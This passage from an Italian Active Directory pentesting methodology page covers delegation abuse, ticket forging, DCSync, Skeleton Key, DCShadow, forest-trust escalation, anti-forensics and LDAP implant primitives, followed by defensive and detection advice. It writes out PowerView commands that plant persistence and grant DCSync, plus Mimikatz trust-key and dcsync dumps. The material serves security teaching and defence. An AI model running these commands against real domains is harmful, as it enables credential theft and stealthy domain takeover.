sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e disponi di privilegi di dominio sul computer, sarai in grado di estrarre dalla memoria i TGT di tutti gli utenti che effettuano il login sul computer.\
Quindi, se un **Domain Admin effettua il login sul computer**, sarai in grado di estrarre il suo TGT e impersonarlo utilizzando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti persino **compromettere automaticamente un Print Server** (si spera che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se un utente o un computer è autorizzato per la "Constrained Delegation", sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi su un computer**.\
Quindi, se **comprometti l'hash** di questo utente/computer, sarai in grado di **impersonare qualsiasi utente** (anche i domain admin) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Disporre del privilegio **WRITE** su un oggetto Active Directory di un computer remoto consente di ottenere l'esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso di Permissions/ACLs

L'utente compromesso potrebbe disporre di alcuni **privilegi interessanti su determinati oggetti di dominio**, che potrebbero consentire di effettuare successivamente **movimenti** laterali/**escalation** dei privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servizio Printer Spooler

Scoprire un **servizio Spool in ascolto** all'interno del dominio può essere **sfruttato** per **acquisire nuove credenziali** ed effettuare una **escalation dei privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso delle sessioni di terze parti

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accedono al sistema tramite RDP, quindi qui puoi trovare come eseguire un paio di attack sulle sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer aggiunti al dominio, assicurando che sia **randomizzata**, univoca e **modificata** frequentemente. Queste password sono archiviate in Active Directory e l'accesso è controllato tramite ACL, esclusivamente per gli utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile effettuare il pivot verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Furto di certificati

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per effettuare un'escalation dei privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso dei Certificate Templates

Se sono configurati **template vulnerabili**, è possibile sfruttarli per effettuare un'escalation dei privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation con account ad alto privilegio

### Dump delle credenziali di dominio

Una volta ottenuti i privilegi di **Domain Admin** o, ancora meglio, di **Enterprise Admin**, puoi eseguire il **dump** del **database del dominio**: _ntds.dit_.

[**Puoi trovare maggiori informazioni sull'attack DCSync qui**](dcsync.md).

[**Puoi trovare maggiori informazioni su come rubare NTDS.dit qui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc come Persistence

Alcune tecniche discusse in precedenza possono essere utilizzate per la persistence.\
Ad esempio, potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere i privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**attack Silver Ticket** crea un **ticket legittimo Ticket Granting Service (TGS)** per uno specifico servizio utilizzando l'**hash NTLM** (ad esempio, l'**hash dell'account del PC**). Questo metodo viene utilizzato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **attack Golden Ticket** consiste nell'ottenere l'accesso all'**hash NTLM dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene utilizzato per firmare tutti i **Ticket Granting Ticket (TGT)**, essenziali per l'autenticazione all'interno della rete AD.

Una volta ottenuto questo hash, l'attaccante può creare **TGT** per qualsiasi account scelto (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono simili ai golden ticket, ma contraffatti in modo da **bypassare i comuni meccanismi di rilevamento dei golden ticket.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence dell'account tramite certificati**

**Avere i certificati di un account o poterli richiedere** è un ottimo modo per mantenere la persistence sull'account dell'utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence del dominio tramite certificati**

**È inoltre possibile utilizzare i certificati per mantenere la persistence con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Gruppo AdminSDHolder

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins ed Enterprise Admins) applicando una **Access Control List (ACL)** standard a questi gruppi, per impedire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attaccante modifica l'ACL di AdminSDHolder per concedere accesso completo a un utente normale, quell'utente ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, consentendo accessi non autorizzati se non viene monitorata attentamente.

[**Puoi trovare maggiori informazioni sul gruppo AdminDSHolder qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenziali DSRM

All'interno di ogni **Domain Controller (DC)** esiste un account di **administrator locale**. Ottenendo diritti admin su una macchina di questo tipo, è possibile estrarre l'hash dell'Administrator locale utilizzando **mimikatz**. Successivamente, è necessaria una modifica al registro per **abilitare l'uso di questa password**, consentendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence tramite ACL

Potresti **concedere** alcune **autorizzazioni speciali** a un **utente** su determinati oggetti di dominio, consentendo all'utente di **eseguire un'escalation dei privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptor** vengono utilizzati per **memorizzare** i **permessi** che un **oggetto** possiede **su** un altro **oggetto**. Se puoi semplicemente **apportare** una **piccola modifica** al **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover appartenere a un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Sfrutta la classe ausiliaria `dynamicObject` per creare principal/GPO/record DNS di breve durata con `entryTTL`/`msDS-Entry-Time-To-Die`; si eliminano autonomamente senza tombstone, cancellando le prove LDAP e lasciando SID orfani, riferimenti `gPLink` non funzionanti o risposte DNS memorizzate nella cache (ad esempio, contaminazione degli ACE di AdminSDHolder o redirect `gPCFileSysPath`/DNS integrati in AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, concedendo l'accesso a tutti gli account di dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri qui cos'è un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare un **SSP personalizzato** per **catturare** in **testo in chiaro** le **credenziali** utilizzate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo utilizza per **inviare attributi** (SIDHistory, SPN...) su oggetti specificati **senza lasciare alcun **log** relativo alle **modifiche**. Sono necessari i privilegi **DA** e devi trovarti nel **root domain**.\
Nota che, se utilizzi dati errati, compariranno log piuttosto compromettenti.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistence tramite LAPS

In precedenza abbiamo discusso di come effettuare un'escalation dei privilegi se disponi di **permessi sufficienti per leggere le password LAPS**. Tuttavia, queste password possono essere utilizzate anche per **mantenere la persistence**.\
Vedi:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera il **Forest** il confine di sicurezza. Ciò implica che la **compromissione di un singolo dominio potrebbe portare potenzialmente alla compromissione dell'intero Forest**.<sup>[[1]](#references)</sup>

### Informazioni di base

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che consente a un utente di un **dominio** di accedere alle risorse di un altro **dominio**. Crea essenzialmente un collegamento tra i sistemi di autenticazione dei due domini, consentendo il flusso continuo delle verifiche di autenticazione. Quando i domini configurano un trust, si scambiano e conservano specifiche **chiavi** all'interno dei rispettivi **Domain Controller (DC)**, fondamentali per l'integrità del trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **dominio trusted**, deve prima richiedere un ticket speciale, chiamato **inter-realm TGT**, al DC del proprio dominio. Questo TGT è cifrato con una **chiave** condivisa concordata da entrambi i domini. L'utente presenta quindi questo TGT al **DC del dominio trusted** per ottenere un service ticket (**TGS**). Dopo la convalida dell'inter-realm TGT da parte del DC del dominio trusted, quest'ultimo emette un TGS che concede all'utente l'accesso al servizio.

**Passaggi**:

1. Un **computer client** nel **Domain 1** avvia il processo utilizzando il proprio **hash NTLM** per richiedere un **Ticket Granting Ticket (TGT)** al proprio **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato correttamente.
3. Il client richiede quindi un **inter-realm TGT** a DC1, necessario per accedere alle risorse nel **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 come parte del trust di dominio bidirezionale.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2) del Domain 2**.
6. DC2 verifica l'inter-realm TGT utilizzando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server nel Domain 2 a cui il client desidera accedere.
7. Infine, il client presenta questo TGS al server, cifrato con l'hash dell'account del server, per ottenere l'accesso al servizio nel Domain 2.

### Trust differenti

È importante notare che **un trust può essere unidirezionale o bidirezionale**. Nelle opzioni bidirezionali, entrambi i domini si considerano trusted a vicenda, mentre nella relazione di trust **unidirezionale** uno dei domini sarà il **trusted** e l'altro il dominio **trusting**. In quest'ultimo caso, **sarai in grado di accedere alle risorse all'interno del dominio trusting solo dal dominio trusted**.

Se il Domain A considera trusted il Domain B, A è il dominio trusting e B è quello trusted. Inoltre, nel **Domain A**, questo sarà un **Outbound trust**; nel **Domain B**, sarà un **Inbound trust**.

**Diverse relazioni di trust**

- **Parent-Child Trusts**: è una configurazione comune all'interno dello stesso forest, in cui un child domain ha automaticamente un trust transitivo bidirezionale con il parent domain. Ciò significa essenzialmente che le richieste di autenticazione possono fluire senza problemi tra il parent e il child.
- **Cross-link Trusts**: chiamati "shortcut trusts", vengono stabiliti tra child domain per accelerare i processi di referral. Nei forest complessi, i referral di autenticazione devono in genere risalire fino al forest root e poi scendere verso il dominio di destinazione. Creando cross-link, il percorso viene abbreviato, con vantaggi particolari negli ambienti geograficamente distribuiti.
- **External Trusts**: vengono configurati tra domini diversi e non correlati e sono per natura non transitivi. Secondo la [documentazione Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trust sono utili per accedere alle risorse di un dominio esterno al forest corrente che non è collegato tramite un forest trust. La sicurezza viene rafforzata tramite SID filtering con gli external trust.
- **Tree-root Trusts**: questi trust vengono stabiliti automaticamente tra il forest root domain e un nuovo tree root aggiunto. Sebbene non siano comunemente utilizzati, i tree-root trust sono importanti per aggiungere nuovi domain tree a un forest, consentendo loro di mantenere un nome di dominio univoco e garantendo la transitività bidirezionale. Ulteriori informazioni sono disponibili nella [guida Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: questo tipo di trust è un trust transitivo bidirezionale tra due forest root domain e applica inoltre il SID filtering per migliorare le misure di sicurezza.
- **MIT Trusts**: questi trust vengono stabiliti con domini Kerberos non Windows e [conformi a RFC4120](https://tools.ietf.org/html/rfc4120). Gli MIT trust sono leggermente più specializzati e sono destinati agli ambienti che richiedono l'integrazione con sistemi basati su Kerberos esterni all'ecosistema Windows.

#### Altre differenze nelle **relazioni di trust**

- Una relazione di trust può anche essere **transitiva** (A considera trusted B, B considera trusted C, quindi A considera trusted C) o **non transitiva**.
- Una relazione di trust può essere configurata come **bidirezionale** (entrambi si considerano trusted a vicenda) o **unidirezionale** (solo uno dei due considera trusted l'altro).

### Attack Path

1. **Enumerare** le relazioni di trust
2. Verificare se qualche **security principal** (utente/gruppo/computer) ha **accesso** alle risorse dell'**altro dominio**, magari tramite voci ACE o perché appartiene a gruppi dell'altro dominio. Cercare **relazioni tra domini** (probabilmente il trust è stato creato proprio per questo).
1. In questo caso, il kerberoast potrebbe essere un'altra opzione.
3. **Compromettere** gli **account** che possono effettuare il **pivot** tra i domini.

Gli attaccanti potrebbero accedere alle risorse di un altro dominio tramite tre meccanismi principali:

- **Local Group Membership**: i principal potrebbero essere aggiunti a gruppi locali sui computer, come il gruppo “Administrators” su un server, ottenendo un controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: i principal possono anche essere membri di gruppi all'interno del dominio esterno. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: i principal potrebbero essere specificati in un'**ACL**, in particolare come entità negli **ACE** all'interno di una **DACL**, ottenendo accesso a risorse specifiche. Per chi desidera approfondire il funzionamento di ACL, DACL e ACE, il whitepaper intitolato “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.<sup>[[17]](#references)</sup>

### Trovare utenti/gruppi esterni con permessi

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare i foreign security principal nel dominio. Si tratterà di utenti/gruppi di **un dominio/forest esterno**.

Puoi verificarlo in **Bloodhound** o utilizzando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalation dei privilegi da Child a Parent nella forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare i trust del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Esistono **2 trusted keys**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi trovare quella utilizzata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Esegui l'escalation come Enterprise admin al dominio child/parent sfruttando il trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendere come sfruttare la Configuration Naming Context (NC) è fondamentale. La Configuration NC funge da repository centrale per i dati di configurazione in una foresta negli ambienti Active Directory (AD). Questi dati vengono replicati a ogni Domain Controller (DC) all'interno della foresta, mentre i DC scrivibili mantengono una copia scrivibile della Configuration NC. Per sfruttarla, è necessario disporre di **SYSTEM privileges on a DC**, preferibilmente un child DC.

**Collega GPO al sito del root DC**

Il container Sites della Configuration NC include informazioni sui siti di tutti i computer aggiunti al dominio all'interno della foresta AD. Operando con SYSTEM privileges su qualsiasi DC, gli attacker possono collegare GPO ai siti dei root DC. Questa azione può compromettere il root domain manipolando le policy applicate a questi siti.

Per informazioni approfondite, è possibile consultare la ricerca su [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometti qualsiasi gMSA nella foresta**

Un attack vector consiste nel prendere di mira i gMSA privilegiati all'interno del dominio. La KDS Root key, essenziale per calcolare le password dei gMSA, è archiviata nella Configuration NC. Con SYSTEM privileges su qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password di qualsiasi gMSA nella foresta.

Un'analisi dettagliata e una guida passo-passo sono disponibili in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attacco MSA delegato complementare (BadSuccessor – sfruttamento degli attributi di migrazione):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerca esterna aggiuntiva: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi oggetti AD privilegiati. Con SYSTEM privileges, un attacker può modificare lo Schema AD per concedere a qualsiasi utente il controllo completo su tutte le classi. Ciò potrebbe consentire accesso e controllo non autorizzati sui nuovi oggetti AD creati.

Ulteriori informazioni sono disponibili in [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 prende di mira il controllo sugli oggetti Public Key Infrastructure (PKI) per creare un certificate template che consente l'autenticazione come qualsiasi utente all'interno della foresta. Poiché gli oggetti PKI risiedono nella Configuration NC, la compromissione di un child DC scrivibile consente di eseguire attacchi ESC5.

Maggiori dettagli sono disponibili in [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Negli scenari privi di ADCS, l'attacker può configurare i componenti necessari, come descritto in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio di una foresta esterna - One-Way (Inbound) o bidirezionale
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario, **il tuo dominio è considerato attendibile** da uno esterno, che ti concede **permessi indeterminati** su di esso. Dovrai individuare **quali principal del tuo dominio dispongono di quale livello di accesso sul dominio esterno** e quindi provare a sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio di una foresta esterna - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario, **il tuo dominio** sta **affidando** alcuni **privilegi** a un principal di **domini diversi**.

Tuttavia, quando un **dominio è considerato trusted** dal dominio trusting, il dominio trusted **crea un utente** con un **nome prevedibile** che usa come **password la password del dominio trusted**. Ciò significa che è possibile **accedere a un utente del dominio trusting per entrare in quello trusted**, enumerarlo e provare a ottenere un’escalation di ulteriori privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il dominio trusted consiste nel trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** rispetto al trust tra domini, cosa non molto comune.

Un altro modo per compromettere il dominio trusted consiste nell'attendere su una macchina alla quale **un utente del dominio trusted può accedere** per effettuare il login tramite **RDP**. A quel punto, l’attaccante potrebbe iniettare codice nel processo della sessione RDP e **accedere al dominio di origine della vittima** da lì.\
Inoltre, se la **vittima ha montato il proprio hard drive**, l’attaccante potrebbe utilizzare il processo della **sessione RDP** per salvare **backdoor** nella **startup folder dell’hard drive**. Questa tecnica è chiamata **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigazione dell'abuso dei trust tra domini

### **SID Filtering:**

- Il rischio degli attacchi che sfruttano l’attributo SID history attraverso i forest trust è mitigato dal SID Filtering, attivato per impostazione predefinita su tutti i trust inter-forest. Ciò si basa sull’assunzione che gli intra-forest trust siano sicuri, considerando la forest, anziché il dominio, come confine di sicurezza, secondo la posizione di Microsoft.
- Tuttavia, esiste un problema: il SID filtering potrebbe interrompere applicazioni e accesso degli utenti, portandone occasionalmente alla disattivazione.

### **Selective Authentication:**

- Per gli inter-forest trust, l’impiego della Selective Authentication garantisce che gli utenti delle due forest non vengano autenticati automaticamente. Sono invece necessari permessi espliciti affinché gli utenti possano accedere ai domini e ai server all’interno del dominio o della forest trusting.
- È importante notare che queste misure non proteggono dallo sfruttamento del writable Configuration Naming Context (NC) né dagli attacchi all’account del trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso di AD basato su LDAP da impianti on-host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa le primitive LDAP in stile bloodyAD come Beacon Object Files x64 che vengono eseguiti interamente all’interno di un impianto on-host (ad esempio, Adaptix C2). Gli operatori compilano il pack con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, caricano `ldap.axs` e quindi eseguono `ldap <subcommand>` dal beacon. Tutto il traffico utilizza il contesto di sicurezza del logon corrente tramite LDAP (389) con signing/sealing o LDAPS (636) con trust automatico dei certificati, quindi non sono necessari socks proxy né artefatti su disco.<sup>[[4]](#references)</sup>

### Enumerazione LDAP lato impianto

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` risolvono short name e percorsi OU nei DN completi ed eseguono il dump degli oggetti corrispondenti.
- `get-object`, `get-attribute` e `get-domaininfo` recuperano attributi arbitrari, inclusi i security descriptor, oltre ai metadati della forest/dominio da `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` espongono direttamente da LDAP i candidati al roasting, le impostazioni di delegation e i descriptor esistenti di [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` e `get-writable --detailed` analizzano la DACL per elencare trustee, diritti (GenericAll/WriteDACL/WriteOwner/scrittura di attributi) ed ereditarietà, fornendo obiettivi immediati per l’escalation dei privilegi tramite ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive di scrittura LDAP per escalation e persistence

- I BOF per la creazione di oggetti (`add-user`, `add-computer`, `add-group`, `add-ou`) consentono all’operatore di predisporre nuovi principal o account macchina ovunque esistano diritti sull’OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` consentono di compromettere direttamente i target una volta individuati i diritti WriteProperty.
- I comandi incentrati sulle ACL, come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, trasformano i diritti WriteDACL/WriteOwner su qualsiasi oggetto AD in reset delle password, controllo dell’appartenenza ai gruppi o privilegi di replica DCSync, senza lasciare artefatti PowerShell/ADSI. Le controparti `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting e abuso di Kerberos

- `add-spn`/`set-spn` rendono immediatamente un utente compromesso soggetto a Kerberoasting; `add-asreproastable` (toggle UAC) lo contrassegna per AS-REP roasting senza modificare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, i flag UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando i percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di PowerShell remoto o RSAT.

### Iniezione di sidHistory, spostamento nelle OU e modellazione della superficie d’attacco

- `add-sidhistory` inietta SID privilegiati nella cronologia SID di un principal controllato (vedere [SID-History Injection](sid-history-injection.md)), fornendo un’ereditarietà furtiva degli accessi interamente tramite LDAP/LDAPS.
- `move-object` modifica il DN/OU di computer o utenti, consentendo a un attacker di trascinare gli asset nelle OU in cui esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember` o `add-spn`.
- I comandi di rimozione con ambito ristretto (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) consentono un rapido rollback dopo che l’operatore ha raccolto credenziali o persistence, riducendo al minimo la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Alcune difese generali

[**Scopri qui ulteriori informazioni su come proteggere le credenziali.**](../stealing-credentials/credentials-protections.md)

### **Misure difensive per la protezione delle credenziali**

- **Restrizioni per i Domain Admins**: è consigliato consentire ai Domain Admins di effettuare il login solo sui Domain Controllers, evitando il loro utilizzo su altri host.
- **Privilegi degli account di servizio**: i servizi non devono essere eseguiti con privilegi Domain Admin (DA), per mantenere la sicurezza.
- **Limitazione temporale dei privilegi**: per le attività che richiedono privilegi DA, la loro durata deve essere limitata. È possibile ottenere questo risultato con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigazione dei relay LDAP**: controllare gli Event ID 2889/3074/3075 e applicare quindi LDAP signing e il channel binding LDAPS su DC/client per bloccare i tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a livello di protocollo dell’attività di Impacket

Se vuoi rilevare tradecraft AD comuni, **non fare affidamento solo sugli artefatti controllati dall’operatore**, come binari rinominati, nomi dei servizi, file batch temporanei o percorsi di output. Crea una baseline del modo in cui i client Windows legittimi costruiscono il traffico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI, quindi cerca le **anomalie di implementazione** che rimangono anche dopo che l’operatore modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidati standalone ad alta affidabilità** (dopo la validazione rispetto alla propria baseline):
- DCE/RPC autenticato con `auth_context_id = 79231 + ctx_id`
- Padding dell’autenticazione DCE/RPC riempito con `0xff`
- Bind Kerberos LDAP che inseriscono un `AP-REQ` Kerberos raw direttamente in `mechToken` SPNEGO
- Richieste negotiate SMB2/3 con valori `ClientGuid` dall’aspetto ASCII
- `IWbemLevel1Login::NTLMLogin` WMI che utilizza il namespace non standard `//./root/cimv2`
- Valori nonce Kerberos hardcoded
- **Più adatti come funzionalità di correlazione/scoring**:
- Liste di etype Kerberos sparse o duplicate, `PA-DATA` insoliti/assenti o ordine degli etype nei TGS-REQ diverso da quello del Windows nativo
- Messaggi NTLM Type 1 privi di informazioni sulla versione o messaggi Type 3 con nomi host null
- NTLMSSP raw trasportato in DCE/RPC anziché in SPNEGO, trailer di verifica DCE/RPC assenti o mismatch degli OID SPNEGO/Kerberos
- La presenza di diversi di questi tratti dallo stesso host/utente/sessione/finestra temporale è molto più significativa di qualsiasi singolo campo debole
- **Da usare come arricchimento, non come alert standalone**:
- Nomi file predefiniti, percorsi di output, nomi casuali dei servizi, nomi batch temporanei, nomi predefiniti degli account computer e stringhe HTTP/WebDAV/RDP/MSSQL specifiche dei tool
- Sono facili da modificare per gli operatori e vengono utilizzati al meglio per spiegare perché un cluster cross-protocol è sospetto
- **Note operative**:
- Alcuni di questi segnali richiedono traffico decrittografato, [analisi PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilità lato servizio
- Validare rispetto a client Samba/Linux, appliance e software legacy prima di trasformarli in alert
- Promuovere i rilevamenti da arricchimento -> hunting -> alerting man mano che aumenta la fiducia nella baseline

### **Implementazione di tecniche di deception**

- L’implementazione della deception comporta la predisposizione di trappole, come utenti o computer esca, con caratteristiche quali password che non scadono o account contrassegnati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o la loro aggiunta a gruppi con privilegi elevati.<sup>[[2]](#references)</sup>
- Un esempio pratico consiste nell’utilizzare tool come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Ulteriori informazioni sul deployment delle tecniche di deception sono disponibili in [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificazione della deception**

- **Per gli oggetti User**: gli indicatori sospetti includono ObjectSID atipici, logon poco frequenti, date di creazione e un numero ridotto di password errate.
